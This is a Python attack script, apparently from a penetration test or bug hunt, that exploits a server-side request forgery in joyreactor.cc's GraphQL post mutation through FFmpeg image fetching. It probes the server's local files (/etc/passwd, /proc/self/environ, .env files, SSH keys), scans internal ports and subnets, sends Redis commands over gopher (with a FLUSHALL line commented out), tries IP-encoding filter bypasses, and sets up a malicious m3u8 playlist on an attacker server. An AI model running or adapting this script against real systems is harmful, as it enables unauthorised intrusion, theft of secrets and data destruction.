#!/usr/bin/env python3
"""
SSRF deep probe for joyreactor.cc — FIND-009
Vector: post(text:"<img src=URL>") → FFmpeg fetches URL server-side

Run: update cookies.txt first, then python ssrf_probe.py [suite]
Suites: files, ports, proto, hls, all (default: all)
"""
import requests, json, time, sys, os
from urllib.parse import unquote

COOKIES_FILE = os.path.join(os.path.dirname(__file__), "cookies.txt")
raw = open(COOKIES_FILE).read().strip()
cookies = {}
for part in raw.split(";"):
    part = part.strip()
    if "=" in part:
        name, _, value = part.partition("=")
        cookies[name.strip()] = unquote(value.strip())

session = requests.Session()
for name, value in cookies.items():
    session.cookies.set(name, value, domain="api.joyreactor.cc")
session.headers.update({
    "Content-Type": "application/json",
    "Origin": "https://joyreactor.cc",
    "Referer": "https://joyreactor.cc/",
})

URL = "https://api.joyreactor.cc/graphql"

# ─── CONFIGURE BEFORE USE ────────────────────────────────────────────────────
WEBHOOK = "https://webhook.site/REPLACE_ME"   # your webhook.site UUID
REDIRECT_SERVER = "http://YOUR_VPS:8080"      # for redirect-chain tests (optional)
# ─────────────────────────────────────────────────────────────────────────────

def probe(label, url, delay=1.5):
    """Send one SSRF probe and return timing + status."""
    body = {"query": f'mutation{{post(tags:[],text:{json.dumps(f"<img src={url}>")}){{post{{id}}}}}}'}
    t0 = time.monotonic()
    try:
        r = session.post(URL, json=body, timeout=15)
        elapsed = (time.monotonic() - t0) * 1000
        d = r.json()
        p = ((d.get("data") or {}).get("post") or {}).get("post") or {}
        created = bool(p.get("id"))
        err = (d.get("errors") or [{}])[0].get("message", "")[:60] if not created else ""
        status = "CREATED" if created else f"blocked({err})"
    except Exception as e:
        elapsed = (time.monotonic() - t0) * 1000
        status = f"error({e})"
    print(f"  [{elapsed:6.0f}ms] {label:<40} {status}")
    time.sleep(delay)
    return elapsed


def section(title):
    print(f"\n{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}")


suite = sys.argv[1] if len(sys.argv) > 1 else "all"

# ── 1. FILE:// — local file read ─────────────────────────────────────────────
if suite in ("files", "all"):
    section("FILE:// — local file read via FFmpeg")
    files = [
        ("file-etc-passwd",     "file:///etc/passwd"),
        ("file-etc-hosts",      "file:///etc/hosts"),
        ("file-proc-environ",   "file:///proc/self/environ"),
        ("file-proc-cmdline",   "file:///proc/self/cmdline"),
        ("file-laravel-env",    "file:///var/www/html/.env"),
        ("file-laravel-env2",   "file:///var/www/.env"),
        ("file-laravel-env3",   "file:///srv/www/.env"),
        ("file-laravel-env4",   "file:///app/.env"),
        ("file-nginx-conf",     "file:///etc/nginx/nginx.conf"),
        ("file-nginx-sites",    "file:///etc/nginx/sites-enabled/default"),
        ("file-apache-conf",    "file:///etc/apache2/sites-enabled/000-default.conf"),
        ("file-ssh-keys",       "file:///root/.ssh/authorized_keys"),
        ("file-www-ssh-keys",   "file:///var/www/.ssh/authorized_keys"),
    ]
    for label, url in files:
        probe(label, url)

# ── 2. INTERNAL PORT SCAN — expand from MySQL/PG findings ────────────────────
if suite in ("ports", "all"):
    section("PORT SCAN — localhost services (baseline 9999 ~900ms)")
    # Baseline
    probe("baseline-closed-9999",    "http://127.0.0.1:9999/", delay=0.5)
    probe("baseline-closed-19999",   "http://127.0.0.1:19999/", delay=0.5)

    ports = [
        (80,   "nginx/apache"),
        (8080, "alt-http / Laravel dev"),
        (8000, "php artisan serve"),
        (443,  "https"),
        (6379, "Redis"),
        (11211,"Memcached"),
        (27017,"MongoDB"),
        (9200, "Elasticsearch"),
        (5601, "Kibana"),
        (4848, "GlassFish admin"),
        (2375, "Docker daemon (unauth)"),
        (2376, "Docker TLS"),
        (9000, "PHP-FPM / Portainer"),
        (3000, "Grafana / Node apps"),
        (4000, "misc"),
        (8443, "alt-https"),
        (8888, "Jupyter"),
        (3001, "misc"),
    ]
    for port, svc in ports:
        probe(f"port-{port}-{svc}", f"http://127.0.0.1:{port}/", delay=0.8)

    # Internal subnet sweep — first host per /24 (just confirms route exists)
    section("INTERNAL SUBNET — first-host sweep")
    subnets = [
        ("10.0.0.1",      "10.0.0.0/8 gateway"),
        ("10.0.1.1",      "10.0.1.x"),
        ("10.1.0.1",      "10.1.0.x"),
        ("172.16.0.1",    "172.16.0.0/12 gateway"),
        ("172.17.0.1",    "Docker default bridge"),
        ("192.168.0.1",   "192.168.0.x"),
        ("192.168.1.1",   "192.168.1.x"),
    ]
    for ip, label in subnets:
        probe(f"subnet-{ip}", f"http://{ip}/", delay=1.0)

# ── 3. PROTOCOL ESCALATION ───────────────────────────────────────────────────
if suite in ("proto", "all"):
    section("PROTOCOL ESCALATION — gopher / dict / ftp / data")

    # gopher:// — raw TCP data (Redis PING)
    # gopher://host:port/_<urlencoded-data>
    # Redis: PING\r\n  →  gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A
    probe("gopher-redis-ping",  "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A")

    # Redis FLUSHALL — destructive, skip unless user confirms
    # probe("gopher-redis-flush","gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A")

    # Redis GET laravel session key pattern
    # KEYS *  →  gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0AKEYS%0D%0A%241%0D%0A%2A%0D%0A
    probe("gopher-redis-keys",  "gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0AKEYS%0D%0A%241%0D%0A%2A%0D%0A")

    # dict:// — banner grab
    probe("dict-redis",         "dict://127.0.0.1:6379/INFO")
    probe("dict-mysql",         "dict://127.0.0.1:3306/INFO")

    # ftp://
    probe("ftp-localhost",      "ftp://127.0.0.1/")

    # IPv6 loopback variants (bypass naive 127.0.0.1 check)
    probe("ipv6-loopback",      "http://[::1]/")
    probe("ipv6-loopback-80",   "http://[::1]:80/")
    probe("ipv6-mysql",         "http://[::1]:3306/")

    # 0.0.0.0 — often resolves to localhost on Linux
    probe("zero-host",          "http://0.0.0.0/")
    probe("zero-host-80",       "http://0.0.0.0:80/")

    # Decimal / octal / hex IP encoding (bypass string-match filter)
    probe("ip-decimal",         "http://2130706433/")            # 127.0.0.1 as decimal
    probe("ip-hex",             "http://0x7f000001/")            # 127.0.0.1 as hex
    probe("ip-octal",           "http://0177.0.0.1/")            # 127 in octal
    probe("ip-short",           "http://127.1/")                 # short form

# ── 4. HLS PLAYLIST TRICK ────────────────────────────────────────────────────
# FFmpeg follows m3u8 playlists. A malicious playlist can point to file:// or
# internal URLs. Requires an external HTTP server to serve the playlist.
#
# Setup (run on your VPS):
#   python3 -m http.server 8080
#   # serve evil.m3u8:
#   #   #EXTM3U
#   #   #EXT-X-MEDIA-SEQUENCE:0
#   #   file:///etc/passwd
#
# Then probe: http://YOUR_VPS:8080/evil.m3u8
if suite in ("hls", "all"):
    section("HLS PLAYLIST — indirect file:// via m3u8 (needs external server)")
    if "REPLACE_ME" not in REDIRECT_SERVER:
        probe("hls-etc-passwd",   f"{REDIRECT_SERVER}/evil.m3u8")
    else:
        print("  [SKIP] Set REDIRECT_SERVER at top of script to enable HLS tests")
        print("  Required: serve evil.m3u8 with contents:")
        print("    #EXTM3U")
        print("    #EXT-X-MEDIA-SEQUENCE:0")
        print("    file:///etc/passwd")

print("\n[done]")
